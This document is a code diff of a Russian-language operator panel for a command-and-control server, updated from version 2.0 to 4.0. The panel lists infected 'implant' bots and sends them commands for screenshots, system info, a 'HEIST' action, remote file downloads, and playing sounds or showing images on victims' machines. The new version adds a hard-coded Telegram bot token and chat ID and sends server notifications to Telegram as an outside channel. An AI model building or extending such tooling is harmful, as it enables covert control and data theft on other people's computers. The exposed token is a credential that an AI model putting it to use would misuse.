@@ -1,134 +1,224 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Версия 2.0 - с миниатюрами) -->
+<!-- Файл: index.html (Версия 4.0 - с внешними уведомлениями) -->
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <title>C2 Панель Управления v2.0</title>
-    <style>
-        :root { --bg-color: #1a1a1c; --primary-color: #2e2e33; --secondary-color: #45454d; --text-color: #e1e1e1; --accent-color: #00aaff; --recon-color: #007bff; --heist-color: #dc3545; --system-color: #6f42c1; --prank-color: #28a745; --download-color: #ffc107; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 25px; display: flex; justify-content: center; }
-        .container { width: 100%; max-width: 1200px; display: flex; flex-direction: column; gap: 25px; }
-        h1, h2 { color: var(--accent-color); text-align: center; margin: 0; padding-bottom: 10px; }
-        h2 { margin-bottom: 20px; border-bottom: 1px solid var(--secondary-color); }
-        h3 { color: var(--text-color); margin-top: 20px; margin-bottom: 10px; text-align: center; border-top: 1px solid var(--secondary-color); padding-top: 20px; }
-        section { background-color: var(--primary-color); padding: 25px; border-radius: 12px; border: 1px solid var(--secondary-color); }
-        button { color: white; padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 1em; font-weight: bold; width: 100%; transition: all 0.2s ease-in-out; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; box-sizing: border-box; }
-        button:hover { filter: brightness(1.2); }
-        .btn-bot { background-color: #495057; }
-        .btn-bot.selected { border: 3px solid var(--accent-color); background-color: #0056b3; }
-        .btn-recon { background-color: var(--recon-color); }
-        .btn-heist { background-color: var(--heist-color); font-size: 1.2em; }
-        .btn-system { background-color: var(--system-color); }
-        .btn-prank { background-color: var(--prank-color); }
-        .btn-download { background-color: var(--download-color); color: #1a1a1c; }
-        input[type="text"] { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid var(--secondary-color); background-color: var(--bg-color); color: var(--text-color); box-sizing: border-box; }
-        footer { margin-top: 20px; text-align: center; min-height: 1.5em; font-weight: 500; color: var(--accent-color); }
-        .grid-controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
-        .flex-container { display: flex; flex-wrap: wrap; gap: 25px; }
-        .flex-item { flex: 1; min-width: 300px; }
-        .thumbnail-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px; }
-        .thumbnail-item { text-align: center; cursor: pointer; background-color: var(--secondary-color); padding: 10px; border-radius: 8px; transition: background-color 0.2s; }
-        .thumbnail-item:hover { background-color: #5a5a63; }
-        .thumbnail-item img { width: 100px; height: 100px; object-fit: cover; border: 2px solid var(--bg-color); border-radius: 8px; transition: transform 0.2s; }
-        .thumbnail-item:hover img { transform: scale(1.05); }
-        .thumbnail-item p { margin: 8px 0 0 0; font-size: 0.8em; word-wrap: break-word; color: var(--text-color); height: 2.5em; overflow: hidden; }
-    </style>
+ <meta charset="UTF-8">
+ <title>C2 Панель Управления v4.0</title>
+ <style>
+  :root { --bg-color: #1a1a1c; --primary-color: #2e2e33; --secondary-color: #45454d; --text-color: #e1e1e1; --accent-color: #00aaff; --recon-color: #007bff; --heist-color: #dc3545; --system-color: #6f42c1; --prank-color: #28a745; --download-color: #ffc107; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 25px; display: flex; justify-content: center; }
+  .container { width: 100%; max-width: 1200px; display: flex; flex-direction: column; gap: 25px; }
+  h1, h2 { color: var(--accent-color); text-align: center; margin: 0; padding-bottom: 10px; }
+  h2 { margin-bottom: 20px; border-bottom: 1px solid var(--secondary-color); }
+  h3 { color: var(--text-color); margin-top: 20px; margin-bottom: 10px; text-align: center; border-top: 1px solid var(--secondary-color); padding-top: 20px; }
+  section { background-color: var(--primary-color); padding: 25px; border-radius: 12px; border: 1px solid var(--secondary-color); }
+  button { color: white; padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 1em; font-weight: bold; width: 100%; transition: all 0.2s ease-in-out; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; box-sizing: border-box; }
+  button:hover { filter: brightness(1.2); }
+  .btn-bot { background-color: #495057; }
+  .btn-bot.selected { border: 3px solid var(--accent-color); background-color: #0056b3; }
+  .btn-recon { background-color: var(--recon-color); }
+  .btn-heist { background-color: var(--heist-color); font-size: 1.2em; }
+  .btn-system { background-color: var(--system-color); }
+  .btn-prank { background-color: var(--prank-color); }
+  .btn-download { background-color: var(--download-color); color: #1a1a1c; }
+  input[type="text"] { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid var(--secondary-color); background-color: var(--bg-color); color: var(--text-color); box-sizing: border-box; }
+  input[type="range"] { width: 100%; cursor: pointer; }
+  footer { margin-top: 20px; text-align: center; min-height: 1.5em; font-weight: 500; color: var(--accent-color); }
+  .grid-controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
+  .flex-container { display: flex; flex-wrap: wrap; gap: 25px; }
+  .flex-item { flex: 1; min-width: 300px; }
+  .thumbnail-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px; }
+  .thumbnail-item { text-align: center; cursor: pointer; background-color: var(--secondary-color); padding: 10px; border-radius: 8px; transition: background-color 0.2s; }
+  .thumbnail-item:hover { background-color: #5a5a63; }
+  .thumbnail-item img { width: 100px; height: 100px; object-fit: cover; border: 2px solid var(--bg-color); border-radius: 8px; transition: transform 0.2s; }
+  .thumbnail-item:hover img { transform: scale(1.05); }
+  .thumbnail-item p { margin: 8px 0 0 0; font-size: 0.8em; word-wrap: break-word; color: var(--text-color); height: 2.5em; overflow: hidden; }
+ </style>
 </head>
 <body>
 <div class="container">
-    <header><h1>Панель Управления V2.0</h1></header>
-    <main>
-        <section>
-            <h2>Боты в сети</h2>
-            <div id="bot-list" class="grid-controls"><p>Подключение к серверу...</p></div>
-        </section>
-        <div id="controls-wrapper" style="display:none;">        <div class="flex-container">
-                <section id="main-controls-section" class="flex-item">
-                    <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
-                    <div class="grid-controls">
-                        <button class="btn-recon" onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
-                        <button class="btn-recon" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
-                        <button class="btn-heist" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
-                    </div>
-                </section>
-                <section id="download-section" class="flex-item">
-                    <h2>Загрузка новых файлов</h2>
-                    <input type="text" id="url-input" placeholder="Вставьте URL файла (mp3, wav, jpg, png)...">
-                    <button class="btn-download" onclick="downloadFile()">Загрузить</button>
-                </section>
-            </div>
-            <section id="prank-controls-section">
-                <h2>Пранки и Медиа</h2>
-                <div class="grid-controls">
-                    <div>
-                        <h3>Управление звуком</h3>
-                        <label for="volume-slider">Системная Громкость</label>
-                        <input type="range" id="volume-slider" min="0" max="100" value="50" oninput="setVolume(this.value)">
-                        <button class="btn-system" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
-                    </div>
-                    <div>
-                        <h3>Локальные звуки</h3>
-                        <div id="audio-files-list" class="grid-controls"></div>
-                    </div>
-                </div>
-                <div>
-                    <h3 style="grid-column: 1 / -1;">Локальные изображения</h3>
-                    <div id="image-files-list" class="thumbnail-container"></div>
-                </div>
-            </section>
-        </div>
-    </main>
-    <footer id="status-footer">Инициализация...</footer>
+ <header><h1>Панель Управления v4.0</h1></header>
+ <main>
+  <section>
+   <h2>Боты в сети</h2>
+   <div id="bot-list" class="grid-controls"><p>Подключение к серверу...</p></div&gt;
+  </section>
+  <div id="controls-wrapper" style="display:none;">
+   <div class="flex-container">
+    <section id="main-controls-section" class="flex-item">
+     <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
+     <div class="grid-controls">
+      <button class="btn-recon" onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
+      <button class="btn-recon" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
+      <button class="btn-heist" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
+     </div>
+    </section>
+    <section id="download-section" class="flex-item">
+     <h2>Загрузка новых файлов</h2>
+     <input type="text" id="url-input" placeholder="Вставьте URL файла (mp3, wav, jpg, png)...">
+     <button class="btn-download" onclick="downloadFile()">Загрузить</button>
+    </section>
+   </div>
+   <section id="prank-controls-section">
+    <h2>Пранки и Медиа</h2>
+    <div class="grid-controls">
+     <div>
+      <h3>Управление звуком</h3>
+      <label for="volume-slider">Системная Громкость</label>
+      <input type="range" id="volume-slider" min="0" max="100" value="50">
+      <button class="btn-system" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
+     </div>
+     <div>
+      <h3>Локальные звуки</h3>
+      <div id="audio-files-list" class="grid-controls"></div>
+     </div>
+    </div>
+    <div>
+     <h3 style="grid-column: 1 / -1;">Локальные изображения</h3>
+     <div id="image-files-list" class="thumbnail-container"></div>
+    </div>
+   </section>
+  </div>
+ </main>
+ <footer id="status-footer">Инициализация...</footer>
 </div>
+
 <script>
-    const ui = { botList: document.getElementById('bot-list'), controlsWrapper: document.getElementById('controls-wrapper'), selectedBotName: document.getElementById('selected-bot-name'), statusFooter: document.getElementById('status-footer'), audioFilesList: document.getElementById('audio-files-list'), imageFilesList: document.getElementById('image-files-list'), volumeSlider: document.getElementById('volume-slider'), urlInput: document.getElementById('url-input'), };
-    let socket, selectedBotId = null;
-    function connect() {
-        ui.statusFooter.textContent = "Подключение к C2..."; socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
-        socket.onopen = () => { ui.statusFooter.textContent = "Соединение установлено."; socket.send(JSON.stringify({ type: 'operator'})); };
-        socket.onmessage = (event) => {
-            const msg = JSON.parse(event.data);
-            if (msg.type === 'bot_list') { updateBotList(msg.data); }
-            else if (msg.type === 'bot_details' && msg.bot_id === selectedBotId) { handleBotDetails(msg.data); }
-            else if (msg.type === 'status') { ui.statusFooter.textContent = msg.data; }
-        };
-        socket.onclose = () => { ui.statusFooter.textContent = "Соединение потеряно. Переподключение..."; selectBot(null); setTimeout(connect, 3000); };
-    }
-    function updateBotList(bots) {
-        const currentSelected = selectedBotId; ui.botList.innerHTML = bots.length ? '' : '<p>Нет активных ботов.</p>';
-        bots.forEach(botId => { const btn = document.createElement('button'); btn.textContent = botId.replace('implant_', ''); btn.className = 'btn-bot'; btn.onclick = () => selectBot(botId); ui.botList.appendChild(btn); });
-        if (currentSelected && bots.includes(currentSelected)) { selectBot(currentSelected); } else { selectBot(bots.length > 0 ? bots[0] : null); }
-    }
-    function selectBot(botId) {
-        selectedBotId = botId;
-        document.querySelectorAll('#bot-list .btn-bot').forEach(btn => { btn.classList.toggle('selected', `implant_${btn.textContent}` === botId); });
-        if (botId) { ui.controlsWrapper.style.display = 'block'; ui.selectedBotName.textContent = botId.replace('implant_', ''); socket.send(JSON.stringify({ type: 'get_details', target_id: botId })); } else { ui.controlsWrapper.style.display = 'none'; }
-    }
-    function handleBotDetails(data) { if (data.files) { renderBotFiles(data.files); } if (data.volume !== undefined) { ui.volumeSlider.value = data.volume; } }
-    function renderBotFiles(files) {
-        const audioContainer = ui.audioFilesList;
-        audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
-        if(files.audio) files.audio.forEach(file => {
-            const btn = document.createElement('button'); btn.textContent = file; btn.className = 'btn-prank'; btn.onclick = () => sendCommand({ action: 'play', filename: file }); audioContainer.appendChild(btn);
-        });
-        const imageContainer = ui.imageFilesList;
-        imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>';
-        if(files.image) files.image.forEach(imgData => {
-            const item = document.createElement('div'); item.className = 'thumbnail-item'; item.onclick = () => sendCommand({action: 'show', filename: imgData.filename });
-            const imgElement = document.createElement('img'); imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : 'https://via.placeholder.com/100x100.png?text=No+Preview'; imgElement.alt = imgData.filename;
-            const nameElement = document.createElement('p'); nameElement.textContent = imgData.filename;
-            item.appendChild(imgElement); item.appendChild(nameElement); imageContainer.appendChild(item);
-        });
-    }
-    function sendCommand(payload) {
-        if (!selectedBotId) return;
-        if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEIST НА ${selectedBotId.replace('implant_', '')}?`)) return;
-        socket.send(JSON.stringify({ type: 'command', target_id: selectedBotId, payload })); ui.statusFooter.textContent = `Команда '${payload.action}' отправлена...`;
-    }
-    const debounce = (func, delay) => { let timeout; return (...args) => { clearTimeout(timeout); timeout = setTimeout(() => func(...args), delay); }; };
-    const setVolume = debounce(value => sendCommand({ action: 'volume', level: value }), 200);
-    function downloadFile() { const url = ui.urlInput.value.trim(); if (url) { sendCommand({ action: 'download', url }); ui.urlInput.value = ''; } }
-    connect();
+ // ==============================================================================
+ // JAVASCRIPT-МОЗГ ПАНЕЛИ V4.0
+ // ==============================================================================
+ const TG_BOT_TOKEN = "7650238850:AAFFcTP5uesNyAreZbW5_gL36brFObm2e34";
+ const TG_CHAT_ID = "1640138978";
+
+ const ui = { botList: document.getElementById('bot-list'), controlsWrapper: document.getElementById('controls-wrapper'), selectedBotName: document.getElementById('selected-bot-name'), statusFooter: document.getElementById('status-footer'), audioFilesList: document.getElementById('audio-files-list'), imageFilesList: document.getElementById('image-files-list'), volumeSlider: document.getElementById('volume-slider'), muteButton: document.querySelector("button[onclick*='mute']"), urlInput: document.getElementById('url-input') };
+ let socket, selectedBotId = null;
+
+ function sendTelegramNotification(message) {
+  console.log(`Отправка в Telegram: ${message}`);
+  const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
+  new Image().src = url; // Отправляем запрос, не заботясь об ответе
+ }
+
+ function connect() {
+  ui.statusFooter.textContent = "Подключение к C2...";
+  socket = new WebSocket(`${window.location.protocol === 'https' ? 'wss' : 'ws'}://${window.location.host}/ws`);
+  socket.onopen = () => { ui.statusFooter.textContent = "Соединение установлено."; socket.send(JSON.stringify({ type: 'operator' })); };
+  socket.onclose = () => { ui.statusFooter.textContent = "Соединение потеряно..."; selectBot(null); setTimeout(connect, 3000); };
+  socket.onmessage = (event) => {
+   const msg = JSON.parse(event.data);
+   switch (msg.type) {
+    case 'bot_list':
+     updateBotList(msg.data);
+     break;
+    case 'notification':
+     sendTelegramNotification(msg.data);
+     break;
+    case 'bot_details':
+     if (msg.bot_id === selectedBotId) {
+      if (msg.data.files) renderBotFiles(msg.data.files);
+      if (msg.data.volume_state) updateVolumeUI(msg.data.volume_state);
+     }
+     break;
+    case 'volume_update':
+     if (msg.bot_id === selectedBotId) {
+      updateVolumeUI(msg.data);
+     }
+     break;
+    case 'file_list_update':
+     if (msg.bot_id === selectedBotId) {
+      renderBotFiles(msg.data.files);
+     }
+     break;
+    case 'status':
+     ui.statusFooter.textContent = `[${selectedBotId ? selectedBotId.replace('implant_', '') : 'C2'}] ${msg.data}`;
+     break;
+   }
+  };
+ }
+
+ function updateBotList(bots) {
+  const currentSelected = selectedBotId;
+  ui.botList.innerHTML = bots.length ? '' : '<p>Нет активных ботов.</p>';
+  bots.forEach(botId => {
+   const btn = document.createElement('button');
+   btn.textContent = botId.replace('implant_', '');
+   btn.className = 'btn-bot';
+   btn.onclick = () => selectBot(botId);
+   ui.botList.appendChild(btn);
+  });
+  if (currentSelected && bots.includes(currentSelected)) {
+   selectBot(currentSelected);
+  } else {
+   selectBot(bots.length > 0 ? bots[0] : null);
+  }
+ }
+
+ function selectBot(botId) {
+  selectedBotId = botId;
+  document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
+   btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
+  });
+  if (botId) {
+   ui.controlsWrapper.style.display = 'block';
+   ui.selectedBotName.textContent = botId.replace('implant_', '');
+   // При выборе бота запрашиваем его полное состояние
+   sendCommand({ action: 'get_details' });
+   sendCommand({ action: 'get_volume_state' });
+  } else {
+   ui.controlsWrapper.style.display = 'none';
+  }
+ }
+
+ function updateVolumeUI(state) {
+  ui.volumeSlider.value = state.level;
+  ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
+  ui.muteButton.style.backgroundColor = state.is_muted ? "var(--heist-color)" : "var(--system-color)";
+ }
+
+ function renderBotFiles(files) {
+  const audioContainer = ui.audioFilesList;
+  audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
+  if(files.audio) files.audio.forEach(file => {
+   const btn = document.createElement('button'); btn.textContent = file; btn.className = 'btn-prank'; btn.onclick = () => sendCommand({ action: 'play', filename: file }); audioContainer.appendChild(btn);
+  });
+  const imageContainer = ui.imageFilesList;
+  imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>';
+  if(files.image) files.image.forEach(imgData => {
+   const item = document.createElement('div'); item.className = 'thumbnail-item'; item.onclick = () => sendCommand({action: 'show', filename: imgData.filename });
+   const imgElement = document.createElement('img');
+   imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : 'https://via.placeholder.com/100x100.png?text=No+Preview';
+   imgElement.alt = imgData.filename;
+   const nameElement = document.createElement('p'); nameElement.textContent = imgData.filename;
+   item.appendChild(imgElement); item.appendChild(nameElement); imageContainer.appendChild(item);
+  });
+ }
+
+ function sendCommand(payload) {
+  if (!selectedBotId) return;
+  const commandType = (payload.action === 'get_details' || payload.action === 'get_volume_state') ? payload.action : 'command';
+  if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEIST НА ${selectedBotId.replace('implant_', '')}?`)) return;
+  socket.send(JSON.stringify({ type: commandType, target_id: selectedBotId, payload }));
+  if (commandType === 'command') {
+   ui.statusFooter.textContent = `Команда '${payload.action}' отправлена...`;
+  }
+ }
+
+ const debounce = (func, delay) => { let timeout; return (...args) => { clearTimeout(timeout); timeout = setTimeout(() => func(...args), delay); }; };
+
+ ui.volumeSlider.addEventListener('input', (event) => {
+  setVolume(event.target.value);
+ });
+ const setVolume = debounce(value => sendCommand({ action: 'volume', level: value }), 250);
+
+ function downloadFile() {
+  const url = ui.urlInput.value.trim();
+  if (url) {
+   sendCommand({ action: 'download', url });
+   ui.urlInput.value = '';
+  }
+ }
+
+ connect();
 </script>
 </body>
 </html>
